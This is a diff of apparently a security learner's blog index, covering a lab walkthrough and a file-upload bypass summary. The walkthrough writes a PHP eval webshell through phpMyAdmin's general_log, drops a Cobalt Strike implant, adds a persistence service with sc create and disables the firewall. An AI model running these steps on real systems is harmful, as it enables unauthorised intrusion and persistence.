@@ -5371,13 +5371,14 @@ insert into test1 value(3,15);
 <p>nmap扫描端口<br>nmap -sV 192.168.247.132</p>
 <p><img src="image-20210622200450400.png" alt="image-20210622200450400"></p>
 <p>80，135，3306</p>
-<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>打卡网页，是一个php探针，测试root/root弱口令连接数据库</p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>打开网页，发现是一个php探针，测试root/root弱口令连接数据库</p>
 <p><img src="image-20210622200554075.png" alt="image-20210622200554075"></p>
 <p>访问<a class="link" href="http://192.168.247.132/phpmyadmin/index.php">http://192.168.247.132/phpmyadmin/index.php<i class="fas fa-external-link-alt"></i></a> 登录后台使用sql执行的功能，修改日志位置来写入webshell<br>打开日志功能<br>set global general_log=on;<br>修改日志文件位置<br>set global general_log_file=’C:\phpStudy\WWW\log3.php’;<br>确认是否成功写入<br>show variables like ‘general_log_file’;</p>
 <p>  <img src="image-20210622201116675.png" alt="image-20210622201116675"></p>
 <p>然后select’<?php @eval($_POST["cmd1"]);?>‘;<br>之后访问<a class="link" href="http://192.168.247.132/log3.php">http://192.168.247.132/log3.php<i class="fas fa-external-link-alt"></i></a> 确定后，用蚁剑连接上目标</p>
 <p><img src="image-20210622201342198.png" alt="image-20210622201342198"></p>
-<p>连上去后，上传一个cs的马到C:/Users/Public/，把shell转移到cs。<br>由于是administrator权限，这里顺便做一个自启动服务的权限维持</p>
+<p>连上去后，上传一个cs的马到C:/Users/Public/，把shell转移到cs。</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>由于是administrator权限，这里顺便做一个自启动服务的权限维持</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell sc create &quot;aaser&quot; binpath&#x3D; &quot;C:&#x2F;Users&#x2F;Public&#x2F;.klee.exe&quot;</span><br><span class="line">shell sc description &quot;aaser&quot; &quot;description&quot;</span><br><span class="line">shell sc config &quot;aaser&quot; start&#x3D; auto</span><br><span class="line">shell net start &quot;aaser&quot;</span><br></pre></td></tr></table></figure>
 
 
@@ -5402,6 +5403,7 @@ insert into test1 value(3,15);
 <li><p>关闭防火墙（可选）：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell netsh firewall set opmode disable</span><br><span class="line">shell netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure></li>
 </ul>
+<p>后面这块就纯属于自己的学习了，简单的入个门</p>
 <h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>用的fscan扫描 ：<a class="link" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan<i class="fas fa-external-link-alt"></i></a><br>扫描结果</p>
 <p><img src="image-20210622221556626.png" alt="image-20210622221556626"></p>
 <ul>
@@ -5504,7 +5506,7 @@ insert into test1 value(3,15);
 
 
 
-<p>由于它在内网回家下，需要用挂代理才可以远程连接到</p>
+<p>由于它在内网环境下，需要用挂代理才可以远程连接到</p>
 <p>这里测试了两个方法，对应win和linux去连接远程桌面</p>
 <h3 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h3><p>CS命令 socks 1234<br>打开后，修改/etc/proxychains.conf<br>添加一行，socks4 127.0.0.1 1234</p>
 <p><img src="image-20210707154004916.png" alt="image-20210707154004916"></p>
@@ -6207,14 +6209,16 @@ insert into test1 value(3,15);
     <title>上传绕过姿势总结</title>
     <url>/2021/07/13/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<p>先放一张图在这里<img src="image-20210713223910890.png" alt="image-20210713223910890"></p>
+<p>在放一张图</p>
+<p><img src="image-20210714092454756.png" alt="image-20210714092454756"></p>
 <p>再放一个链接:<a class="link" href="https://www.freebuf.com/articles/web/265245.html">https://www.freebuf.com/articles/web/265245.html<i class="fas fa-external-link-alt"></i></a></p>
 <p>实践操作过 √</p>
-<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="1-js检查√"><a href="#1-js检查√" class="headerlink" title="1. js检查√"></a>1. js检查√</h3><ul>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="1-js检查-√"><a href="#1-js检查-√" class="headerlink" title="1. js检查  √"></a>1. js检查  √</h3><ul>
 <li>原理：通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式。</li>
 <li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
 <li>客户端的校验绕过：直接修改js代码或者使用抓包的方法修改请求内容绕过，可以先上传一个gif木马，通过抓包修改为jsp/php/asp，只用这种方法来检测是肯定可以绕过的。</li>
 </ul>
-<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="检查后缀"><a href="#检查后缀" class="headerlink" title="检查后缀"></a>检查后缀</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="1-上传特殊可解析后缀"><a href="#1-上传特殊可解析后缀" class="headerlink" title="1. 上传特殊可解析后缀"></a>1. 上传特殊可解析后缀</h5><p>黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。<br><code>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</code><br>比如，黑名单禁止上传.asp|.aspx|.php|.jsp后缀文件。<br>但是Apache的httpd.conf配置文件中，有这样一行内容：<br><code>AddType application/x-httpd-php .php .php3 .phtml</code><br>这里上传.php、.php3、.phtml后缀的文件都可以当做php文件来执行</p>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="检查后缀"><a href="#检查后缀" class="headerlink" title="检查后缀"></a>检查后缀</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="1-上传特殊可解析后缀-√"><a href="#1-上传特殊可解析后缀-√" class="headerlink" title="1. 上传特殊可解析后缀  √"></a>1. 上传特殊可解析后缀  √</h5><p>黑名单规则不严谨，在某些特定的环境中，某些特殊的后缀名仍然会被当做php文件解析。<br><code>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml</code><br>比如，黑名单禁止上传.asp|.aspx|.php|.jsp后缀文件。<br>但是Apache的httpd.conf配置文件中，有这样一行内容：<br><code>AddType application/x-httpd-php .php .php3 .phtml</code><br>这里上传.php、.php3、.phtml后缀的文件都可以当做php文件来执行</p>
 <h5 id="2-上传-htaccess"><a href="#2-上传-htaccess" class="headerlink" title="2. 上传.htaccess"></a>2. 上传.htaccess</h5><ul>
 <li>原理：在Apache里，.htaccess是一个配置文件。它可以用来控制所在目录的访问权限以及解析设置。可以通过修改该文件的配置项，将该目录下的所有文件作为php文件来解析。.htaccess可以写入apache配置信息，改变当前目录以及子目录的apache配置信息。</li>
 <li>应用场景：黑名单没有禁止.htaccess文件上传。</li>
@@ -6249,7 +6253,7 @@ insert into test1 value(3,15);
 <p>例如:<code>&quot;shell.php &quot;</code>Windows会自动去掉末尾的空格变成<code>&quot;shell.php&quot;</code></p>
 </li>
 </ul>
-<h5 id="6-DATA绕过√"><a href="#6-DATA绕过√" class="headerlink" title="6. ::$DATA绕过√"></a>6. ::$DATA绕过√</h5><ul>
+<h5 id="6-DATA绕过-√"><a href="#6-DATA绕过-√" class="headerlink" title="6. ::$DATA绕过  √"></a>6. ::$DATA绕过  √</h5><ul>
 <li>应用场景：Windows平台，没有使用str_ireplace()将::$DATA替换为空，导致可以利用<strong>NTFS文件流特性。</strong></li>
 <li>利用方式：假设xxx.php的内容为<?php phpinfo();?></li>
 </ul>
